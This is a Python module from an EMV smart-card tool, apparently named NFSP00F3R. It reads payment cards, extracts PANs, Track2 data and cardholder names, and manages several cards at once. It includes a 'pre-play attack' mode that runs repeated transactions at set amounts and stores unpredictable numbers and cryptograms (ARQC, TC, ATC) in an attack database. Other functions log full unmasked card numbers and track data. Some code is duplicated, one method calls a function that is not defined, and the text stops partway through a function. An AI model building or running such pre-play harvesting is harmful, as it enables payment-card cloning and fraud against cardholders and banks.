#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NFSP00F3R V5.00 - EMV Terminal and Smart Card Manager
=======================================================

File: card_manager.py
Authors: Gregory King & Matthew Braunschweig
Date: August 16, 2025
Description: Multi-card management and switching functionality

Classes:
- CardManager: Main card management class for handling multiple cards
- CardEvent: Event class for card insertion/removal notifications

Functions:
- generate_card_id(): Generate unique card identifier
- extract_pan_from_track2(): Extract PAN from track2 data

This module manages multiple EMV cards simultaneously, handles card switching,
and provides event notifications for card insertion and removal events.

Based on code from:
- Yagoor/EMV (multi-card management)
- dimalinux/EMV-Tools (card switching logic)
- LucaBongiorni/EMV-NFC-Paycard-Reader (PAN extraction)
"""

import logging
import hashlib
import re
from typing import Dict, List, Optional, Any, Tuple
from PyQt5.QtCore import QObject, pyqtSignal
from datetime import datetime

from emv_card import EMVCard

class CardEvent:
    """
    Represents a card insertion or removal event.
    Used for notifying UI components of card status changes.
    """
    
    INSERT = "insert"
    REMOVE = "remove"
    
    def __init__(self, event_type: str, card_id: str = None, card: 'EMVCard' = None):
        """
        Initialize card event.
        
        Args:
            event_type: Type of event (INSERT or REMOVE)
            card_id: Unique card identifier
            card: EMV card object (for INSERT events)
        """
        self.event_type = event_type
        self.card_id = card_id
        self.card = card
        self.timestamp = datetime.now()

class CardManager(QObject):
    """
    Manages multiple EMV cards with switching and event notification capabilities.
    Provides a centralized interface for all card operations and maintains
    card history and state.
    """
    
    # Qt signals for card events
    card_inserted = pyqtSignal(str, object)  # card_id, EMVCard
    card_removed = pyqtSignal(str)          # card_id
    card_switched = pyqtSignal(str)         # card_id
    cards_updated = pyqtSignal()            # General update signal
    
    def __init__(self):
        """Initialize the card manager with empty card collection."""
        super().__init__()
        
        self.logger = logging.getLogger(__name__)
        
        # Dictionary of all managed cards {card_id: EMVCard}
        self.cards: Dict[str, EMVCard] = {}
        
        # Currently active card ID
        self.current_card_id: Optional[str] = None
        
        # Card insertion order for UI display
        self.card_order: List[str] = []
        
        # Card statistics
        self.card_stats = {
            'total_cards_read': 0,
            'unique_pans': 0,
            'session_start': datetime.now()
        }
        
        # Pre-play attack data generation mode
        self.preplay_mode_enabled = False
        self.preplay_database_path = None
        self.attack_manager = None
        
        self.logger.info("Card manager initialized")
    
    def enable_preplay_mode(self, database_path: str = None) -> bool:
        """
        Enable pre-play data generation mode.
        
        Args:
            database_path: Optional path to save preplay database
            
        Returns:
            True if successfully enabled
        """
        try:
            from attack_manager import AttackManager
            
            self.attack_manager = AttackManager()
            self.preplay_mode_enabled = True
            self.preplay_database_path = database_path
            
            self.logger.info(f"Pre-play mode enabled. Database: {database_path or 'memory only'}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to enable preplay mode: {e}")
            return False
    
    def disable_preplay_mode(self):
        """Disable pre-play data generation mode."""
        self.preplay_mode_enabled = False
        self.preplay_database_path = None
        self.attack_manager = None
        self.logger.info("Pre-play mode disabled")
    
    def is_preplay_mode_enabled(self) -> bool:
        """Check if preplay mode is enabled."""
        return self.preplay_mode_enabled
    
    def add_card(self, card: EMVCard, reader_name: str = "Unknown") -> str:
        """
        Add a new card to the manager.
        
        Args:
            card: EMV card object to add
            reader_name: Name of the reader that read the card
            
        Returns:
            Unique card identifier
        """
        try:
            # Generate unique card ID
            card_id = self._generate_card_id(card)
            
            # Check if card already exists
            if card_id in self.cards:
                self.logger.info(f"Card {card_id} already exists, updating")
                self.cards[card_id] = card
            else:
                # Add new card
                self.cards[card_id] = card
                self.card_order.append(card_id)
                
                # Update statistics
                self.card_stats['total_cards_read'] += 1
                self._update_unique_pans()
                
                self.logger.info(f"Added new card {card_id} from reader {reader_name}")
            
            # Set card metadata
            card.card_id = card_id
            card.reader_name = reader_name
            card.insertion_time = datetime.now()
            
            # Set as current card if it's the first one
            if self.current_card_id is None:
                self.current_card_id = card_id
                self.card_switched.emit(card_id)
            
            # Emit signals
            self.card_inserted.emit(card_id, card)
            self.cards_updated.emit()
            
            return card_id
            
        except Exception as e:
            self.logger.error(f"Error adding card: {e}")
            raise
    
    def remove_card(self, card_id: str) -> bool:
        """
        Remove a card from the manager.
        
        Args:
            card_id: Unique card identifier to remove
            
        Returns:
            True if card was removed, False if not found
        """
        try:
            if card_id not in self.cards:
                self.logger.warning(f"Attempted to remove non-existent card {card_id}")
                return False
            
            # Remove card
            del self.cards[card_id]
            
            # Remove from order list
            if card_id in self.card_order:
                self.card_order.remove(card_id)
            
            # Handle current card removal
            if self.current_card_id == card_id:
                if self.card_order:
                    # Switch to the most recent card
                    self.current_card_id = self.card_order[-1]
                    self.card_switched.emit(self.current_card_id)
                else:
                    self.current_card_id = None
                    self.card_switched.emit("")
            
            # Update statistics
            self._update_unique_pans()
            
            # Emit signals
            self.card_removed.emit(card_id)
            self.cards_updated.emit()
            
            self.logger.info(f"Removed card {card_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error removing card {card_id}: {e}")
            return False
    
    def switch_card(self, card_id: str) -> bool:
        """
        Switch to a different active card.
        
        Args:
            card_id: Card ID to switch to
            
        Returns:
            True if switch was successful, False otherwise
        """
        try:
            if card_id not in self.cards:
                self.logger.warning(f"Attempted to switch to non-existent card {card_id}")
                return False
            
            if self.current_card_id == card_id:
                self.logger.debug(f"Card {card_id} is already current")
                return True
            
            self.current_card_id = card_id
            self.card_switched.emit(card_id)
            
            self.logger.info(f"Switched to card {card_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error switching to card {card_id}: {e}")
            return False
    
    def get_current_card(self) -> Optional[EMVCard]:
        """
        Get the currently active card.
        
        Returns:
            Current EMV card or None if no card is active
        """
        if self.current_card_id and self.current_card_id in self.cards:
            return self.cards[self.current_card_id]
        return None
    
    def get_card(self, card_id: str) -> Optional[EMVCard]:
        """
        Get a specific card by ID.
        
        Args:
            card_id: Card identifier
            
        Returns:
            EMV card or None if not found
        """
        return self.cards.get(card_id)
    
    def get_all_cards(self) -> Dict[str, EMVCard]:
        """
        Get all managed cards.
        
        Returns:
            Dictionary of all cards {card_id: EMVCard}
        """
        return self.cards.copy()
    
    def get_card_list(self) -> List[tuple]:
        """
        Get a list of cards with basic information for UI display.
        
        Returns:
            List of tuples (card_id, display_name, pan_masked, card_type)
        """
        card_list = []
        
        for card_id in self.card_order:
            if card_id in self.cards:
                card = self.cards[card_id]
                
                # Generate display name
                display_name = self._generate_display_name(card)
                
                # Mask PAN for display
                pan_masked = self._mask_pan(card.pan) if card.pan else "Unknown"
                
                # Determine card type
                card_type = self._determine_card_type(card)
                
                card_list.append((card_id, display_name, pan_masked, card_type))
        
        return card_list
    
    def clear_all_cards(self):
        """Remove all cards from the manager."""
        try:
            card_ids = list(self.cards.keys())
            
            for card_id in card_ids:
                self.remove_card(card_id)
            
            self.card_order.clear()
            self.current_card_id = None
            
            # Reset statistics
            self.card_stats['total_cards_read'] = 0
            self.card_stats['unique_pans'] = 0
            
            self.cards_updated.emit()
            self.logger.info("Cleared all cards")
            
        except Exception as e:
            self.logger.error(f"Error clearing cards: {e}")
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Get card manager statistics.
        
        Returns:
            Dictionary containing various statistics
        """
        return {
            'total_cards': len(self.cards),
            'current_card_id': self.current_card_id,
            'total_cards_read': self.card_stats['total_cards_read'],
            'unique_pans': self.card_stats['unique_pans'],
            'session_duration': datetime.now() - self.card_stats['session_start'],
            'card_types': self._get_card_type_distribution()
        }
    
    def export_all_cards(self) -> List[Dict[str, Any]]:
        """
        Export all cards to a list of dictionaries.
        
        Returns:
            List of card dictionaries suitable for JSON export
        """
        exported_cards = []
        
        for card_id, card in self.cards.items():
            try:
                card_data = card.to_json()
                card_data['card_id'] = card_id
                card_data['insertion_order'] = self.card_order.index(card_id) if card_id in self.card_order else -1
                exported_cards.append(card_data)
                
            except Exception as e:
                self.logger.error(f"Error exporting card {card_id}: {e}")
        
        return exported_cards
    
    def import_cards(self, cards_data: List[Dict[str, Any]]) -> int:
        """
        Import cards from a list of dictionaries.
        
        Args:
            cards_data: List of card dictionaries
            
        Returns:
            Number of cards successfully imported
        """
        imported_count = 0
        
        for card_data in cards_data:
            try:
                # Create EMV card from data
                card = EMVCard()
                card.from_json(card_data)
                
                # Add to manager
                card_id = self.add_card(card, "Imported")
                imported_count += 1
                
                self.logger.info(f"Imported card {card_id}")
                
            except Exception as e:
                self.logger.error(f"Error importing card: {e}")
        
        self.logger.info(f"Imported {imported_count} cards")
        return imported_count
    
    def _generate_card_id(self, card: EMVCard) -> str:
        """
        Generate a unique identifier for a card based on its data.
        
        Args:
            card: EMV card object
            
        Returns:
            Unique card identifier string
        """
        # Use PAN + expiry date + AID for uniqueness
        id_data = ""
        
        if card.pan:
            id_data += card.pan
        
        if card.expiry_date:
            id_data += card.expiry_date
        
        if card.applications:
            # Use first AID
            aid = next(iter(card.applications.keys()), "")
            id_data += aid
        
        # If no unique data, use timestamp
        if not id_data:
            id_data = str(datetime.now().timestamp())
        
        # Generate hash
        hash_obj = hashlib.md5(id_data.encode('utf-8'))
        return hash_obj.hexdigest()[:12]
    
    def _generate_display_name(self, card: EMVCard) -> str:
        """
        Generate a human-readable display name for a card.
        
        Args:
            card: EMV card object
            
        Returns:
            Display name string
        """
        if card.cardholder_name:
            return card.cardholder_name
        
        if card.pan:
            # Use masked PAN
            return f"Card *{card.pan[-4:]}"
        
        if card.applications:
            # Use first application name
            first_app = next(iter(card.applications.values()), {})
            app_label = first_app.get('application_label', '')
            if app_label:
                return app_label
        
        return "Unknown Card"
    
    def _mask_pan(self, pan: str) -> str:
        """
        Mask a PAN for display purposes.
        
        Args:
            pan: Primary Account Number
            
        Returns:
            Masked PAN string
        """
        if not pan or len(pan) < 8:
            return "****"
        
        return f"{pan[:4]}{'*' * (len(pan) - 8)}{pan[-4:]}"
    
    def _determine_card_type(self, card: EMVCard) -> str:
        """
        Determine the card type based on PAN and applications.
        
        Args:
            card: EMV card object
            
        Returns:
            Card type string
        """
        if not card.pan:
            return "Unknown"
        
        # BIN ranges for major card types
        pan_prefix = card.pan[:6]
        
        # Visa
        if pan_prefix.startswith('4'):
            return "Visa"
        
        # Mastercard
        if pan_prefix.startswith(('5', '2')):
            return "Mastercard"
        
        # American Express
        if pan_prefix.startswith(('34', '37')):
            return "American Express"
        
        # Discover
        if pan_prefix.startswith('6'):
            return "Discover"
        
        # Check applications for more specific identification
        if card.applications:
            for aid, app_data in card.applications.items():
                app_label = app_data.get('application_label', '').lower()
                
                if 'visa' in app_label:
                    return "Visa"
                elif 'mastercard' in app_label or 'master' in app_label:
                    return "Mastercard"
                elif 'amex' in app_label or 'american' in app_label:
                    return "American Express"
                elif 'discover' in app_label:
                    return "Discover"
                elif 'paypal' in app_label:
                    return "PayPal"
                elif 'venmo' in app_label:
                    return "Venmo"
                elif 'cash' in app_label:
                    return "Cash App"
        
        return "Unknown"
    
    def _update_unique_pans(self):
        """Update the count of unique PANs."""
        unique_pans = set()
        
        for card in self.cards.values():
            if card.pan:
                unique_pans.add(card.pan)
        
        self.card_stats['unique_pans'] = len(unique_pans)
    
    def _get_card_type_distribution(self) -> Dict[str, int]:
        """
        Get distribution of card types.
        
        Returns:
            Dictionary of card type counts
        """
        type_counts = {}
        
        for card in self.cards.values():
            card_type = self._determine_card_type(card)
            type_counts[card_type] = type_counts.get(card_type, 0) + 1
        
        return type_counts

    def read_card(self, reader_name: str = None) -> Optional[Dict[str, Any]]:
        """
        Read a card from a reader and add it to the manager.
        
        Args:
            reader_name: Name of the reader to read from (if None, use first available)
            
        Returns:
            Dictionary containing card data and ATR, or None if failed
        """
        try:
            self.logger.info(f"Reading card from reader: {reader_name or 'first available'}")
            
            # Import reader manager
            from readers import ReaderManager
            reader_manager = ReaderManager()
            
            # Get available readers
            available_readers = reader_manager.detect_readers()
            self.logger.info(f"Available readers: {available_readers}")
            
            if not available_readers:
                self.logger.warning("No readers detected")
                return None
            
            # Find the target reader
            target_reader = None
            if reader_name:
                # Find specific reader
                for reader in available_readers:
                    if reader_name.lower() in reader.get('description', '').lower():
                        target_reader = reader
                        break
                if not target_reader:
                    self.logger.warning(f"Reader {reader_name} not found in available readers")
                    return None
            else:
                # Use first available reader
                target_reader = available_readers[0]
            
            self.logger.info(f"Using reader: {target_reader['description']}")
            
            # Connect to reader
            connection_result = reader_manager.connect_reader(target_reader)
            if not connection_result:
                self.logger.warning(f"Failed to connect to reader: {target_reader['description']}")
                return None
            
            self.logger.info(f"Connected to reader: {target_reader['description']}")
            
            # Get the connected reader instance
            reader_instance = reader_manager.get_reader(target_reader['name'])
            if not reader_instance:
                self.logger.error("Failed to get reader instance")
                return None
            
            self.logger.info(f"Got reader instance: {type(reader_instance).__name__}")
            self.logger.info(f"Reader connected: {reader_instance.connected}")
            self.logger.info(f"Card present: {reader_instance.card_present}")
            
            if not reader_instance.card_present:
                self.logger.warning("No card present in reader")
                return None
            
            self.logger.info("Establishing card connection...")
            
            # Ensure card connection is established
            if not reader_instance.connect_to_card():
                self.logger.error("Failed to connect to card")
                return None
            
            # Read ATR
            atr = reader_instance.get_atr()
            if not atr:
                self.logger.error("Failed to get ATR")
                return None
            
            self.logger.info(f"Card detected with ATR: {atr.hex().upper() if isinstance(atr, bytes) else atr}")
            
            # Create EMVCard and perform EMV application selection
            from emv_card import EMVCard
            emv_card = EMVCard()
            emv_card.atr = atr.hex().upper() if isinstance(atr, bytes) else str(atr)
            
            # Try to read EMV applications
            success = self._read_emv_applications(reader_instance, emv_card)
            
            if success:
                # Add card to manager
                card_id = self.add_card(emv_card, target_reader['description'])
                
                # Convert EMVCard to UI-compatible format
                ui_card_data = emv_card.to_ui_dict()
                
                return {
                    'card_data': ui_card_data,
                    'card_id': card_id,
                    'atr': emv_card.atr,
                    'reader': target_reader['description']
                }
            else:
                self.logger.warning("Failed to read EMV applications, falling back to basic card data")
                # Return basic card info with actual ATR and available data
                emv_card.card_type = "Unknown/Contactless"
                
                # Try to get UID if available
                try:
                    from smartcard.System import readers as pcsc_readers
                    from smartcard.util import toHexString
                    
                    # Get direct PC/SC connection for UID
                    pcsc_reader_list = pcsc_readers()
                    if pcsc_reader_list:
                        # Find matching reader
                        pcsc_reader = None
                        for pr in pcsc_reader_list:
                            if str(pr) == target_reader['name']:
                                pcsc_reader = pr
                                break
                        
                        if pcsc_reader:
                            # Direct PC/SC connection for UID
                            pcsc_connection = pcsc_reader.createConnection()
                            pcsc_connection.connect()
                            
                            # Get UID command: FFCA000000
                            response, sw1, sw2 = pcsc_connection.transmit([0xFF, 0xCA, 0x00, 0x00, 0x00])
                            
                            if sw1 == 0x90 and sw2 == 0x00 and response:
                                uid = toHexString(response).replace(' ', '')
                                emv_card.uid = uid
                                self.logger.info(f"Got card UID: {uid}")
                            
                            pcsc_connection.disconnect()
                            
                except Exception as uid_error:
                    self.logger.debug(f"UID extraction failed: {uid_error}")
                
                card_id = self.add_card(emv_card, target_reader['description'])
                ui_card_data = emv_card.to_ui_dict()
                
                return {
                    'card_data': ui_card_data,
                    'card_id': card_id,
                    'atr': emv_card.atr,
                    'reader': target_reader['description']
                }
                
        except Exception as e:
            self.logger.error(f"Failed to read card: {e}")
            import traceback
            self.logger.debug(f"Traceback: {traceback.format_exc()}")
            return None
    
    def _read_emv_applications(self, reader_instance, emv_card) -> bool:
        """
        Read EMV applications from the card using the universal parser.
        
        Args:
            reader_instance: Connected reader instance
            emv_card: EMVCard object to populate
            
        Returns:
            True if successful, False otherwise
        """
        try:
            from universal_emv_parser import UniversalEMVParser
            
            self.logger.info("Starting EMV application reading with Universal parser")
            
            # Ensure we have a fresh card connection
            connection = None
            
            # First, ensure the card connection is active
            if not reader_instance.connected or not reader_instance.card_present:
                self.logger.warning("Reader not connected or no card present")
                return False
            
            # Re-establish card connection to ensure it's fresh for EMV parsing
            try:
                if not reader_instance.connect_to_card():
                    self.logger.error("Failed to re-establish card connection for EMV parsing")
                    return False
                    
                connection = reader_instance.connection
                if not connection:
                    self.logger.error("No connection object available after connect")
                    return False
                    
            except Exception as connect_error:
                self.logger.error(f"Card connection error: {connect_error}")
                return False
            
            # Use the comprehensive terminal emulation parsing for complete data extraction
            parser = UniversalEMVParser()
            
            # Use comprehensive parsing to extract ALL card data including cryptograms from ALL AIDs
            self.logger.info("Starting comprehensive EMV parsing with terminal emulation")
            
            # Let the parser create its own connection for compatibility
            card_data = parser.parse_card(connection=None)
            
            if card_data:
                self.logger.info(f"Comprehensive terminal emulation successful")
                
                # Log comprehensive results
                if card_data.get('pan'):
                    self.logger.info(f"Primary PAN: {card_data.get('pan', 'N/A')[:6]}******")
                if card_data.get('all_applications'):
                    self.logger.info(f"Applications processed: {len(card_data['all_applications'])}")
                if card_data.get('all_cryptograms'):
                    self.logger.info(f"Cryptograms generated: {len(card_data['all_cryptograms'])}")
                
                # Populate EMV card with comprehensive data
                emv_card.pan = card_data.get('pan')
                emv_card.expiry_date = card_data.get('expiry_date')
                emv_card.cardholder_name = card_data.get('cardholder_name')
                emv_card.card_type = card_data.get('card_type', 'EMV Card')
                emv_card.aid = card_data.get('aid', '')
                emv_card.application_label = card_data.get('application_label', '')
                
                # Store ALL comprehensive data for UI display
                emv_card.all_applications = card_data.get('all_applications', {})
                emv_card.cryptographic_summary = card_data.get('cryptographic_summary', {})
                
                # Log comprehensive results
                all_apps = card_data.get('all_applications', {})
                crypto_summary = card_data.get('cryptographic_summary', {})
                
                self.logger.info(f"Processed {len(all_apps)} applications:")
                for aid, app_data in all_apps.items():
                    app_name = app_data.get('application_label', 'Unknown')
                    has_crypto = 'application_cryptogram' in app_data
                    self.logger.info(f"  {aid}: {app_name} - Cryptogram: {'Yes' if has_crypto else 'No'}")
                
                if crypto_summary:
                    self.logger.info(f"Cryptographic data summary:")
                    for aid, crypto_info in crypto_summary.items():
                        crypto_type = crypto_info.get('cryptogram_type', 'Unknown')
                        self.logger.info(f"  {aid}: {crypto_type}")
                else:
                    self.logger.info("No cryptograms generated (normal for contactless cards)")
                    
                # Store standard EMV data structures
                if all_apps:
                    # Create EMVApplication objects for each AID
                    for aid, app_data in all_apps.items():
                        from emv_card import EMVApplication
                        app = EMVApplication(aid=aid)
                        app.application_label = app_data.get('application_label', 'EMV Application')
                        app.preferred_name = app.application_label.split()[0] if app.application_label else 'EMV'
                        app.priority_indicator = 1
                        
                        # Store cryptogram data if available
                        if 'application_cryptogram' in app_data:
                            crypto_data = {
                                'cryptogram': app_data.get('application_cryptogram'),
                                'type': app_data.get('cryptogram_type', 'Unknown'),
                                'cid': app_data.get('cid'),
                                'atc': app_data.get('atc')
                            }
                            app.cryptograms.append(crypto_data)
                        
                        emv_card.applications[aid] = app
                        
                    # Set first application as current
                    first_aid = next(iter(all_apps.keys()))
                    emv_card.current_application = first_aid
                
                # Store comprehensive EMV data
                if 'applications' in card_data:
                    emv_card.applications_data = card_data['applications']  # Store all applications data
                    
                    # Process each application found on the card
                    for aid, app_data in card_data['applications'].items():
                        from emv_card import EMVApplication
                        app = EMVApplication(aid=aid)
                        app.application_label = app_data.get('application_label', 'EMV Application')
                        app.preferred_name = app.application_label.split()[0] if app.application_label else 'EMV'
                        app.priority_indicator = 1
                        
                        # Add cryptogram data to the application
                        if app_data.get('application_cryptogram') or app_data.get('cid') or app_data.get('atc'):
                            crypto_data = {
                                'cryptogram': app_data.get('application_cryptogram'),
                                'cid': app_data.get('cid'),
                                'atc': app_data.get('atc'),
                                'cryptogram_type': app_data.get('cryptogram_type'),
                                'timestamp': 'N/A'
                            }
                            app.cryptograms.append(crypto_data)
                            
                        emv_card.applications[aid] = app
                        
                    # Set the first application as current
                    if card_data['applications']:
                        first_aid = next(iter(card_data['applications'].keys()))
                        emv_card.current_application = first_aid
                        
                    self.logger.info(f"Processed {len(card_data['applications'])} applications on card")
                
                # Store cryptographic data from all applications
                if 'cryptographic_data' in card_data:
                    emv_card.cryptographic_data = card_data['cryptographic_data']
                    
                    crypto_count = len(card_data['cryptographic_data'])
                    self.logger.info(f"Cryptographic data available for {crypto_count} applications:")
                    for aid, crypto_info in card_data['cryptographic_data'].items():
                        crypto_type = crypto_info.get('cryptogram_type', 'Unknown')
                        cryptogram = crypto_info.get('application_cryptogram', 'N/A')
                        self.logger.info(f"  {aid}: {crypto_type} - {cryptogram[:16]}...")
                
                # Store comprehensive data for UI display
                if 'all_pans' in card_data:
                    self.logger.info(f"Found {len(card_data['all_pans'])} unique PANs: {[pan[:6]+'******' for pan in card_data['all_pans']]}")
                if 'all_expiry_dates' in card_data:
                    self.logger.info(f"Found expiry dates: {card_data['all_expiry_dates']}")
                if 'all_cardholder_names' in card_data:
                    self.logger.info(f"Found cardholder names: {card_data['all_cardholder_names']}")
                
                if 'track_data' in card_data:
                    emv_card.track_data = card_data['track_data']
                    # Also populate individual track fields for compatibility
                    if 'track2' in card_data['track_data']:
                        emv_card.track2_data = card_data['track_data']['track2']
                    if 'track1' in card_data['track_data']:
                        emv_card.track1_data = card_data['track_data']['track1']
                if 'tlv_data' in card_data:
                    emv_card.tlv_data = card_data['tlv_data']
                if 'oda_data' in card_data:
                    emv_card.oda_data = card_data['oda_data']
                if 'apdu_log' in card_data:
                    emv_card.apdu_log = card_data['apdu_log']
                
                # Create primary application object if AID available
                if card_data.get('aid'):
                    from emv_card import EMVApplication
                    aid = card_data.get('aid')
                    if aid not in emv_card.applications:  # Only create if not already created above
                        app = EMVApplication(aid=aid)
                        app.application_label = card_data.get('application_label', 'EMV Application')
                        app.preferred_name = app.application_label.split()[0] if app.application_label else 'EMV'
                        app.priority_indicator = 1
                        
                        emv_card.applications[aid] = app
                        emv_card.current_application = aid
                    from emv_card import EMVApplication
                    aid = card_data.get('aid')
                    app = EMVApplication(aid=aid)
                    app.application_label = card_data.get('application_label', 'EMV Application')
                    app.preferred_name = app.application_label.split()[0] if app.application_label else 'EMV'
                    app.priority_indicator = 1
                    
                    emv_card.applications[aid] = app
                    emv_card.current_application = aid
                
                self.logger.info(f"Successfully parsed EMV card: {emv_card.card_type}")
                self.logger.info(f"PAN: {emv_card.pan[:6]}******")
                self.logger.info(f"Expiry: {emv_card.expiry_date}")
                
                # Generate pre-play data if mode is enabled
                if self.preplay_mode_enabled and self.attack_manager:
                    self.logger.info("Generating pre-play attack data...")
                    self._generate_preplay_data(reader_instance, emv_card, card_data)
                
                return True
            else:
                self.logger.warning("Universal parser did not extract PAN data")
                return False
                
        except Exception as e:
            self.logger.error(f"Universal EMV parsing failed: {e}")
            import traceback
            self.logger.debug(f"Traceback: {traceback.format_exc()}")
            return False

    def _parse_record_data(self, emv_card, record_data: bytes):
        """Parse EMV record data for TLV tags and update card data."""
        try:
            # Convert to hex string for parsing
            hex_data = record_data.hex().upper()
            self.logger.debug(f"Parsing record data: {hex_data}")
            
            # Parse TLV manually for better control
            parsed_data = self._parse_tlv_data(hex_data)
            
            # Store all TLV data
            emv_card.tlv_data.update(parsed_data)
            
            # Extract specific important fields
            for tag, tag_data in parsed_data.items():
                try:
                    if tag == '5A':  # PAN
                        pan = self._parse_pan_from_hex(tag_data)
                        if pan:
                            emv_card.pan = pan
                            self.logger.info(f"Extracted PAN: {pan}")
                    
                    elif tag == '57':  # Track 2 Equivalent Data
                        track2 = self._parse_track2_from_hex(tag_data)
                        if track2:
                            emv_card.track2_data = track2
                            self.logger.info(f"Extracted Track2: {track2}")
                            
                            # Also extract PAN from Track2 if we don't have it yet
                            if not emv_card.pan and 'D' in track2:
                                track2_pan = track2.split('D')[0]
                                if 13 <= len(track2_pan) <= 19 and track2_pan.isdigit():
                                    emv_card.pan = track2_pan
                                    self.logger.info(f"Extracted PAN from Track2: {track2_pan}")
                            
                            # Extract expiry from Track2
                            if not emv_card.expiry_date and 'D' in track2:
                                track2_parts = track2.split('D')[1]
                                if len(track2_parts) >= 4:
                                    expiry_raw = track2_parts[:4]
                                    # Track2 format is YYMM, convert to MM/YY format
                                    if len(expiry_raw) == 4 and expiry_raw.isdigit():
                                        yy = expiry_raw[:2]
                                        mm = expiry_raw[2:4]
                                        emv_card.expiry_date = f"{mm}/{yy}"
                                        self.logger.info(f"Extracted expiry from Track2: {emv_card.expiry_date}")
                    
                    elif tag == '5F20':  # Cardholder name
                        try:
                            name = bytes.fromhex(tag_data).decode('ascii', errors='ignore').strip()
                            if name:
                                emv_card.cardholder_name = name
                                self.logger.info(f"Extracted cardholder name: {name}")
                        except:
                            self.logger.debug(f"Failed to decode cardholder name: {tag_data}")
                    
                    elif tag == '5F24':  # Application expiry date
                        if len(tag_data) == 6:  # YYMMDD format
                            emv_card.expiry_date = f"{tag_data[2:4]}/{tag_data[:2]}"
                            self.logger.info(f"Extracted expiry date: {emv_card.expiry_date}")
                    
                    elif tag == '5F30':  # Service code
                        emv_card.service_code = tag_data
                        
                except Exception as e:
                    self.logger.warning(f"Error processing tag {tag}: {e}")
                    
        except Exception as e:
            self.logger.warning(f"Failed to parse record data: {e}")
    
    def _parse_tlv_data(self, hex_data):
        """Parse TLV data from hex string."""
        parsed_data = {}
        
        try:
            i = 0
            while i < len(hex_data):
                if i + 2 > len(hex_data):
                    break
                
                # Get tag
                tag = hex_data[i:i+2]
                i += 2
                
                # Handle multi-byte tags
                if tag in ['9F', '5F'] and i + 2 <= len(hex_data):
                    tag += hex_data[i:i+2]
                    i += 2
                
                if i >= len(hex_data):
                    break
                
                # Get length
                if i + 2 > len(hex_data):
                    break
                    
                length_hex = hex_data[i:i+2]
                length = int(length_hex, 16)
                i += 2
                
                if i + length * 2 > len(hex_data):
                    break
                
                # Get value
                value = hex_data[i:i+(length*2)]
                i += length * 2
                
                # Handle template tags (contain nested TLV)
                if tag == '70':
                    # Parse nested TLV data
                    nested_data = self._parse_tlv_data(value)
                    parsed_data.update(nested_data)
                else:
                    parsed_data[tag] = value
                    
        except Exception as e:
            self.logger.warning(f"TLV parsing error: {e}")
        
        return parsed_data
    
    def _parse_pan_from_hex(self, hex_value):
        """Parse PAN from hex value (packed BCD)."""
        try:
            pan = ""
            for i in range(0, len(hex_value), 2):
                byte_hex = hex_value[i:i+2]
                byte_val = int(byte_hex, 16)
                
                # Each byte contains two BCD digits
                high_nibble = (byte_val >> 4) & 0x0F
                low_nibble = byte_val & 0x0F
                
                for nibble in [high_nibble, low_nibble]:
                    if nibble <= 9:
                        pan += str(nibble)
                    elif nibble == 0xF:
                        # Padding, return what we have
                        if 13 <= len(pan) <= 19:
                            return pan
                        else:
                            return None
            
            # Validate PAN length
            if 13 <= len(pan) <= 19:
                return pan
            return None
            
        except Exception as e:
            self.logger.debug(f"PAN parsing error: {e}")
            return None
    
    def _parse_track2_from_hex(self, hex_value):
        """Parse Track2 data from hex value (packed BCD)."""
        try:
            track2 = ""
            for i in range(0, len(hex_value), 2):
                byte_hex = hex_value[i:i+2]
                byte_val = int(byte_hex, 16)
                
                # Each byte contains two BCD digits
                high_nibble = (byte_val >> 4) & 0x0F
                low_nibble = byte_val & 0x0F
                
                for nibble in [high_nibble, low_nibble]:
                    if nibble <= 9:
                        track2 += str(nibble)
                    elif nibble == 0xD:
                        track2 += "D"  # Separator
                    elif nibble == 0xF:
                        # Padding, return what we have
                        return track2
                        
            return track2
            
        except Exception as e:
            self.logger.debug(f"Track2 parsing error: {e}")
            return None

    def stop_reading(self):
        """
        Stop card reading operation.
        """
        try:
            self.logger.info("Stopping card reading")
            # Signal that reading has stopped
            self.cards_updated.emit()
        except Exception as e:
            self.logger.error(f"Failed to stop reading: {e}")

    def cleanup(self):
        """
        Clean up card manager resources.
        Called when application is shutting down.
        """
        try:
            self.logger.info("Card manager cleanup...")
            # Clear all cards
            self.clear_all_cards()
            # Stop any ongoing reading
            self._stop_reading()
            self.logger.info("Card manager cleanup complete")
        except Exception as e:
            self.logger.error(f"Card manager cleanup failed: {e}")

    def _generate_preplay_data(self, reader_instance, emv_card, card_data):
        """
        Generate pre-play attack data by performing EMV transactions.
        
        Args:
            reader_instance: Connected card reader instance
            emv_card: EMVCard object with parsed data
            card_data: Raw card data from universal parser
        """
        try:
            self.logger.info("Starting pre-play data generation with full EMV transaction simulation")
            
            # Get connection for transaction simulation
            connection = reader_instance.connection
            if not connection:
                self.logger.error("No connection available for preplay data generation")
                return
            
            # Generate preplay data for each application found
            all_apps = card_data.get('all_applications', {})
            preplay_entries_generated = 0
            
            for aid, app_data in all_apps.items():
                try:
                    self.logger.info(f"Generating preplay data for AID: {aid}")
                    
                    # Select the application
                    if not self._select_application_for_preplay(connection, aid):
                        self.logger.warning(f"Failed to select application {aid} for preplay")
                        continue
                    
                    # Perform multiple transactions to generate diverse preplay data
                    transaction_amounts = [
                        "000000000100",  # $1.00
                        "000000001000",  # $10.00
                        "000000005000",  # $50.00
                        "000000010000",  # $100.00
                    ]
                    
                    for amount in transaction_amounts:
                        entry_data = self._perform_preplay_transaction(connection, aid, amount)
                        if entry_data:
                            # Add to preplay database
                            success = self.attack_manager.add_preplay_entry(
                                un=entry_data['un'],
                                atc=entry_data.get('atc'),
                                arqc=entry_data.get('arqc'),
                                tc=entry_data.get('tc'),
                                amount=amount,
                                currency='0840'  # USD
                            )
                            
                            if success:
                                preplay_entries_generated += 1
                                self.logger.info(f"Generated preplay entry for UN: {entry_data['un']}")
                            
                except Exception as e:
                    self.logger.error(f"Error generating preplay data for {aid}: {e}")
                    continue
            
            self.logger.info(f"Pre-play data generation complete: {preplay_entries_generated} entries generated")
            
            # Save to database file if specified
            if self.preplay_database_path and preplay_entries_generated > 0:
                self._save_preplay_database()
                
        except Exception as e:
            self.logger.error(f"Pre-play data generation failed: {e}")
    
    def _select_application_for_preplay(self, connection, aid: str) -> bool:
        """Select EMV application for preplay transaction."""
        try:
            # Convert AID to bytes
            aid_bytes = bytes.fromhex(aid)
